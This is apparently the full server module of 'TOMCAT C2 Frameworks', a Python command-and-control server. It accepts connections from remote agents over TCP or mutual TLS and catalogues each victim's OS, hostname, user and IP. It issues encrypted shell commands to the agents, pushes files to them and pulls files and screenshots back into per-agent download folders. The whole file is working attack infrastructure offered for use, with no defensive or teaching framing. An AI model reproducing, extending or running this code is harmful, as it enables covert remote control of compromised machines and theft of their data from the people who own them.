#!/usr/bin/python3
# TOMCAT C2 Frameworks
# Author: TOM7
# GitHub: tom7voldemort

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~TOM7
"""

import socket
import ssl
import threading
import json
import os
import traceback
from datetime import datetime
from Cores.Systems.System import StrObject
from Cores.Systems.Cryptography import Cryptography
from Config.Color import TMColor
from time import sleep, time


class TOMCATC2SERVER:
    def __init__(self, Host="0.0.0.0", Port=4444, UseMTLS=False):
        self.Host = Host
        self.Port = Port
        self.UseMTLS = UseMTLS
        self.Agents = {}
        self.AgentID = 0
        self.ServerSocket = None
        self.SSLContext = None
        self.Running = False
        self.Crypto = Cryptography()
        self.Crypto.GenerateKey()
        self.Lock = threading.Lock()
        self.CommandLock = {}
        self.AcceptThread = None
        self.EventCallbacks = []
        self.ServerKeyPath = "Certs/server-key.pem"
        self.ServerCertPath = "Certs/server-cert.pem"
        self.CACertPath = "Certs/ca-cert.pem"

    def AddEventListener(self, Callback):
        self.EventCallbacks.append(Callback)

    def EventEmitter(self, EventType, Data):
        for Callback in self.EventCallbacks:
            try:
                Callback(EventType, Data)
            except Exception as e:
                StrObject.Error(f"Event Callback Error: {e}")

    def SetupSSLContext(self):
        try:
            if not os.path.exists(self.ServerKeyPath):
                StrObject.Warnings(f"Server key not found: {self.ServerKeyPath}")
                return False
            if not os.path.exists(self.ServerCertPath):
                StrObject.Warnings(f"Server cert not found: {self.ServerCertPath}")
                return False
            if not os.path.exists(self.CACertPath):
                StrObject.Warnings(f"CA cert not found: {self.CACertPath}")
                return False
            self.SSLContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.SSLContext.load_cert_chain(
                certfile=self.ServerCertPath, keyfile=self.ServerKeyPath
            )
            self.SSLContext.load_verify_locations(cafile=self.CACertPath)
            self.SSLContext.verify_mode = ssl.CERT_REQUIRED
            self.SSLContext.check_hostname = False
            try:
                self.SSLContext.set_ciphers("HIGH:!aNULL:!MD5:!DSS")
            except Exception:
                pass
            try:
                self.SSLContext.minimum_version = ssl.TLSVersion.TLSv1_2
            except AttributeError:
                self.SSLContext.options |= ssl.OP_NO_SSLv2
                self.SSLContext.options |= ssl.OP_NO_SSLv3
                self.SSLContext.options |= ssl.OP_NO_TLSv1
                self.SSLContext.options |= ssl.OP_NO_TLSv1_1
            StrObject.Messages(f"MTLS Context Initialized Successfully")
            return True
        except Exception as e:
            StrObject.Error(f"MTLS Setup Error: {e}")
            return False

    def StartServer(self):
        try:
            if self.UseMTLS:
                if not self.SetupSSLContext():
                    return (
                        False,
                        "Failed to setup MTLS. Run: python3 start.py --init-certs",
                    )
            self.ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.ServerSocket.bind((self.Host, self.Port))
            self.ServerSocket.listen(5)
            self.Running = True
            self.AcceptThread = threading.Thread(
                target=self.AcceptConnections, daemon=True
            )
            self.AcceptThread.start()
            SecurityMode = "MTLS" if self.UseMTLS else "TCP"
            self.EventEmitter(
                "ServerStarted",
                {
                    "Host": self.Host,
                    "Port": self.Port,
                    "Key": self.Crypto.GetKey().decode(),
                    "Security": SecurityMode,
                },
            )
            Message = f"Server Started On {self.Host}:{self.Port} [{SecurityMode}]"
            return True, Message
        except Exception as e:
            return False, f"Error Starting Server: {str(e)}"

    def StopServer(self):
        self.Running = False
        if self.ServerSocket:
            try:
                self.ServerSocket.close()
            except Exception:
                pass
        if self.AcceptThread and self.AcceptThread.is_alive():
            self.AcceptThread.join(timeout=2)
        AgentList = []
        with self.Lock:
            AgentList = list(self.Agents.items())
        for AgentId, Agent in AgentList:
            try:
                Agent["Socket"].close()
            except Exception:
                pass
        with self.Lock:
            self.Agents.clear()
        self.EventEmitter("ServerStopped", {})

    def AcceptConnections(self):
        while self.Running:
            try:
                self.ServerSocket.settimeout(1.0)
                ClientSocket, Address = self.ServerSocket.accept()
                if self.UseMTLS and self.SSLContext:
                    try:
                        AgentSocket = self.SSLContext.wrap_socket(
                            ClientSocket,
                            server_side=True,
                            do_handshake_on_connect=True,
                        )
                        try:
                            ClientCert = AgentSocket.getpeercert()
                            Subject = dict(x[0] for x in ClientCert["subject"])
                            CommonName = Subject.get("commonName", "Unknown")
                            StrObject.Messages(
                                f"\nMTLS: Client Verified - CN: {CommonName}"
                            )
                        except Exception:
                            pass
                    except ssl.SSLError as e:
                        StrObject.Error(f"SSL Handshake Error: {e}")
                        try:
                            ClientSocket.close()
                        except Exception:
                            pass
                        continue
                    except Exception:
                        try:
                            ClientSocket.close()
                        except Exception:
                            pass
                        continue
                else:
                    AgentSocket = ClientSocket
                Thread = threading.Thread(
                    target=self.AgentHandler,
                    args=(AgentSocket, Address),
                    daemon=True,
                )
                Thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.Running:
                    self.EventEmitter("Error", {"Message": f"Accept Error: {str(e)}"})

    def AgentHandler(self, AgentSocket, Address):
        CurrentAgentId = None
        ClientCN = "Unknown"
        try:
            if self.UseMTLS:
                try:
                    ClientCert = AgentSocket.getpeercert()
                    if ClientCert:
                        Subject = dict(x[0] for x in ClientCert["subject"])
                        ClientCN = Subject.get("commonName", "Unknown")
                except Exception:
                    ClientCN = "Unknown"
            AgentSocket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            AgentSocket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
            AgentSocket.settimeout(10)
            AgentSocket.sendall(self.Crypto.GetKey())
            sleep(0.2)
            AgentInfo = AgentSocket.recv(4096).decode("utf-8")
            if not AgentInfo:
                self.EventEmitter("Error", {"Message": "No Agent Info Received"})
                AgentSocket.close()
                return
            Info = json.loads(AgentInfo)
            sleep(0.5)
            with self.Lock:
                self.AgentID += 1
                CurrentAgentId = self.AgentID
                AgentName = (
                    ClientCN
                    if (self.UseMTLS and ClientCN != "Unknown")
                    else f"Agent-{self.AgentID}"
                )
                AgentData = {
                    "Socket": AgentSocket,
                    "Address": Address,
                    "ID": self.AgentID,
                    "Type": "TOMCAT",
                    "AgentName": AgentName,
                    "OS": Info.get("OS", "N/A"),
                    "Hostname": Info.get("Hostname", "N/A"),
                    "User": Info.get("User", "N/A"),
                    "Arch": Info.get("Architecture", "N/A"),
                    "AgentIP": Info.get("AgentIP", "N/A"),
                    "JoinedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "CertCN": ClientCN if self.UseMTLS else "N/A",
                    "MTLSEnabled": self.UseMTLS,
                    "ShellMode": Info.get("ShellMode", "Standard"),
                    "Status": "Online",
                }
                self.Agents[self.AgentID] = AgentData
                self.CommandLock[self.AgentID] = threading.Lock()
            self.EventEmitter("AgentConnected", AgentData)
            self.AgentMonitor(CurrentAgentId, AgentSocket)
        except socket.timeout:
            try:
                AgentSocket.close()
            except Exception:
                pass
            if CurrentAgentId:
                self.RemoveAgent(CurrentAgentId)
        except Exception as e:
            self.EventEmitter("Error", {"Message": f"Agent Handshake Error: {str(e)}"})
            try:
                AgentSocket.close()
            except Exception:
                pass
            if CurrentAgentId:
                self.RemoveAgent(CurrentAgentId)

    def AgentMonitor(self, AgentId, AgentSocket):
        IsSSL = isinstance(AgentSocket, ssl.SSLSocket)
        try:
            while self.Running:
                with self.Lock:
                    if AgentId not in self.Agents:
                        break
                CmdLock = self.CommandLock.get(AgentId)
                if CmdLock and CmdLock.locked():
                    sleep(2)
                    continue
                try:
                    AgentSocket.getpeername()
                except OSError:
                    raise ConnectionError("Agent disconnected")
                if not IsSSL:
                    try:
                        AgentSocket.settimeout(5.0)
                        Data = AgentSocket.recv(1, socket.MSG_PEEK)
                        if not Data:
                            raise ConnectionError("Agent disconnected")
                    except socket.timeout:
                        pass
                    except (ConnectionError, ConnectionResetError, OSError):
                        raise ConnectionError("Agent disconnected")
                sleep(3)
        except Exception as e:
            self.EventEmitter("AgentDisconnected", {"ID": AgentId, "Reason": str(e)})
            self.RemoveAgent(AgentId)

    def SendFileToAgent(self, AgentSocket, LocalFilepath):
        try:
            if not os.path.exists(LocalFilepath):
                return False, f"File not found: {LocalFilepath}"
            if not os.path.isfile(LocalFilepath):
                return False, f"Not a file: {LocalFilepath}"
            Filename = os.path.basename(LocalFilepath)
            FileSize = os.path.getsize(LocalFilepath)
            Extension = os.path.splitext(Filename)[1] or ".bin"
            with open(LocalFilepath, "rb") as F:
                FileData = F.read()
            Metadata = json.dumps(
                {
                    "type": "file",
                    "filename": Filename,
                    "size": FileSize,
                    "extension": Extension,
                }
            )
            MetadataEncrypted = self.Crypto.Encrypt(Metadata)
            MetadataPacket = MetadataEncrypted + b"<META>"
            AgentSocket.sendall(MetadataPacket)
            sleep(0.1)
            AgentSocket.sendall(FileData)
            AgentSocket.sendall(b"<END>")
            return True, f"File sent: {Filename} ({FileSize} bytes)"
        except Exception as e:
            return False, f"SendFileToAgent error: {str(e)}"

    def SaveReceivedFile(self, Filename, FileData, AgentId):
        try:
            DownloadDir = "Downloads"
            if not os.path.exists(DownloadDir):
                os.makedirs(DownloadDir, exist_ok=True)
            AgentDir = os.path.join(DownloadDir, f"Agent_{AgentId}")
            if not os.path.exists(AgentDir):
                os.makedirs(AgentDir, exist_ok=True)
            BaseName, Extension = os.path.splitext(Filename)
            Filepath = os.path.join(AgentDir, Filename)
            Counter = 1
            while os.path.exists(Filepath):
                Filepath = os.path.join(AgentDir, f"{BaseName}_{Counter}{Extension}")
                Counter += 1
            with open(Filepath, "wb") as F:
                F.write(FileData)
            return Filepath
        except Exception:
            return None

    def ExecuteCommand(self, AgentId, Command):
        with self.Lock:
            if AgentId not in self.Agents:
                return False, "Agent Not Found"
            Agent = self.Agents[AgentId]
            AgentSocket = Agent["Socket"]
        CmdLock = self.CommandLock.get(AgentId)
        if not CmdLock:
            return False, "Agent Not Found"
        ReceivedData = b""
        with CmdLock:
            try:
                CommandLower = Command.strip().lower()
                IsUploadCommand = CommandLower.startswith("upload")
                IsDownloadCommand = (
                    CommandLower.startswith("download")
                    or CommandLower.startswith("dl ")
                    or CommandLower.startswith("screenshot")
                )
                if IsUploadCommand:
                    Parts = Command.strip().split(maxsplit=2)
                    if len(Parts) < 2:
                        return False, "Usage: upload <local_filepath> <remote_filepath>"
                    LocalFilepath = Parts[1].strip()
                    RemotePath = Parts[2].strip() if len(Parts) > 2 else ""
                    if not os.path.exists(LocalFilepath):
                        return False, f"Local file not found: {LocalFilepath}"
                    Filename = os.path.basename(LocalFilepath)
                    if RemotePath:
                        if RemotePath.endswith("/"):
                            AgentCommand = f"upload {RemotePath}{Filename}"
                        else:
                            AgentCommand = f"upload {RemotePath}"
                    else:
                        AgentCommand = f"upload {Filename}"
                    Encrypted = self.Crypto.Encrypt(AgentCommand)
                    AgentSocket.settimeout(30)
                    AgentSocket.sendall(Encrypted)
                    sleep(0.3)
                    Success, Msg = self.SendFileToAgent(AgentSocket, LocalFilepath)
                    if not Success:
                        return False, Msg
                    AgentSocket.settimeout(30)
                    ReceivedData = b""
                    StartTime = time()
                    while True:
                        if time() - StartTime > 30:
                            return True, "File sent (no confirmation within 30s)"
                        try:
                            Chunk = AgentSocket.recv(32768)
                            if not Chunk:
                                return True, "File sent"
                            ReceivedData += Chunk
                            if ReceivedData.endswith(b"<END>"):
                                ReceivedData = ReceivedData[:-5]
                                break
                        except socket.timeout:
                            if ReceivedData:
                                if ReceivedData.endswith(b"<END>"):
                                    ReceivedData = ReceivedData[:-5]
                                break
                            continue
                    if ReceivedData:
                        try:
                            Decrypted = self.Crypto.Decrypt(ReceivedData)
                            return True, Decrypted
                        except Exception:
                            return True, "File sent successfully"
                    return True, "File sent successfully"
                Encrypted = self.Crypto.Encrypt(Command)
                AgentSocket.settimeout(180)
                AgentSocket.sendall(Encrypted)
                if IsDownloadCommand:
                    AgentSocket.settimeout(30)
                    try:
                        InitialChunk = AgentSocket.recv(4096)
                        if not InitialChunk:
                            return False, "Agent disconnected"
                        if b"<META>" not in InitialChunk:
                            for Retry in range(10):
                                try:
                                    AgentSocket.settimeout(2.0)
                                    NextChunk = AgentSocket.recv(4096)
                                    if NextChunk:
                                        InitialChunk += NextChunk
                                        if b"<META>" in InitialChunk:
                                            break
                                except socket.timeout:
                                    continue
                        if b"<META>" in InitialChunk:
                            MetaParts = InitialChunk.split(b"<META>", 1)
                            MetaData = MetaParts[0]
                            Remainder = MetaParts[1] if len(MetaParts) > 1 else b""
                            try:
                                MetadataDecrypted = self.Crypto.Decrypt(MetaData)
                                Metadata = json.loads(MetadataDecrypted)
                                Filename = Metadata.get("filename", "received_file")
                                FileData = Remainder
                                StartTime = time()
                                LastRecvTime = time()
                                while True:
                                    if time() - StartTime > 300:
                                        return False, "File transfer timeout"
                                    if time() - LastRecvTime > 30:
                                        break
                                    try:
                                        AgentSocket.settimeout(5.0)
                                        Chunk = AgentSocket.recv(32768)
                                        if not Chunk:
                                            break
                                        FileData += Chunk
                                        LastRecvTime = time()
                                        if b"<END>" in FileData:
                                            FileData = FileData.split(b"<END>", 1)[0]
                                            break
                                    except socket.timeout:
                                        if b"<END>" in FileData:
                                            FileData = FileData.split(b"<END>", 1)[0]
                                            break
                                        continue
                                if FileData:
                                    SavedPath = self.SaveReceivedFile(
                                        Filename, FileData, AgentId
                                    )
                                    if SavedPath:
                                        return (
                                            True,
                                            f"File received and saved: {SavedPath}",
                                        )
                                    return False, "Failed to save file"
                                return False, "No file data received"
                            except Exception as MetaErr:
                                return False, f"File metadata error: {str(MetaErr)}"
                        else:
                            AgentSocket.settimeout(180)
                            ReceivedData = InitialChunk
                    except Exception as FileError:
                        traceback.print_exc()
                        return False, f"File error: {str(FileError)}"
                if not IsDownloadCommand or "ReceivedData" not in locals():
                    ReceivedData = b""
                elif not ReceivedData:
                    ReceivedData = b""
                StartTime = time()
                LastRecvTime = time()
                while True:
                    try:
                        Chunk = AgentSocket.recv(32768)
                        if not Chunk:
                            if ReceivedData:
                                break
                            raise ConnectionError("Agent Disconnected")
                        ReceivedData += Chunk
                        LastRecvTime = time()
                        if ReceivedData.endswith(b"<END>"):
                            ReceivedData = ReceivedData[:-5]
                            break
                        if time() - StartTime > 180:
                            return False, "Command Timeout (180s)"
                        if time() - LastRecvTime > 30 and ReceivedData:
                            break
                    except socket.timeout:
                        if ReceivedData:
                            if ReceivedData.endswith(b"<END>"):
                                ReceivedData = ReceivedData[:-5]
                            break
                        return False, "No Response From Agent (Timeout)"
                if ReceivedData:
                    try:
                        Decrypted = self.Crypto.Decrypt(ReceivedData)
                        return True, Decrypted
                    except Exception as e:
                        return False, f"Decryption Error: {str(e)}"
                return False, "No Response From Agent"
            except (ConnectionResetError, ConnectionError, BrokenPipeError) as e:
                self.RemoveAgent(AgentId)
                return False, f"Connection Lost: {str(e)}"
            except ssl.SSLError as e:
                self.RemoveAgent(AgentId)
                return False, f"SSL Error: {str(e)}"
            except Exception as e:
                self.RemoveAgent(AgentId)
                return False, f"Error: {str(e)}"

    def RemoveAgent(self, AgentId):
        with self.Lock:
            if AgentId in self.Agents:
                try:
                    self.Agents[AgentId]["Socket"].close()
                except Exception:
                    pass
                del self.Agents[AgentId]
                self.CommandLock.pop(AgentId, None)
                self.EventEmitter("AgentRemoved", {"ID": AgentId})

    def GetAgents(self):
        with self.Lock:
            return list(self.Agents.values())

    def GetAgent(self, AgentId):
        with self.Lock:
            return self.Agents.get(AgentId, None)

    def GetSessionStat(self):
        return {
            "ServerAddress": self.Host,
            "ServerPort": self.Port,
            "ServerKey": (self.Crypto.GetKey().decode()),
        }
